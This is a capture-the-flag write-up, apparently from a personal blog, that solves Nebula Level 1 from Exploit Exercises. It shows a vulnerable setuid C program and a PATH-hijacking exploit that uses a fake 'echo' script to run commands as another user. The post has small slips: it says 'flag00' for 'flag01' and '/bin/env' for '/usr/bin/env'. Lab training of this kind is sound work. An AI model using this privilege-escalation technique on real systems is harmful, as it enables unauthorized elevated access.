---
layout: post
title:  "Exploit Excercises - Nebula: Level 1"
date:   2016-07-30 12:32:00 +0200
categories: excercises security
---

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

~~~ c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
~~~

Let's start by looking at the actual binary.

~~~ bash
level01@nebula:~$ ls -la /home/flag01/flag01
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 /home/flag01/flag01
~~~

We'll quickly spot that it has the setuid bit set, so no matter which user actually starts the binary, it will run as the `flag00` user.

The actual exploit might be obvious to you if you're familiar with the Linux command line. The system call in the end relies on `/bin/env` to set environment variables. So by modifying, say `PATH`, we can change which `echo` will be executed.

Let's prepare a small script that runs the `getflag` command:

~~~ bash
level01@nebula:~$ cat echo
#!/bin/sh
getflag
~~~

Now let's set the `PATH` variable to include `level01`s home directory and run the script:

~~~ bash
level01@nebula:~$ export PATH="/home/level01:$PATH"
level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account
~~~


What happened here was that we added another directory for the system to look for the `echo` binary (our own users home directory in this case), so when the `flag00` binary expects to run the system `echo`, it will instead run our version and execute `getflag` as the user `flag00`.

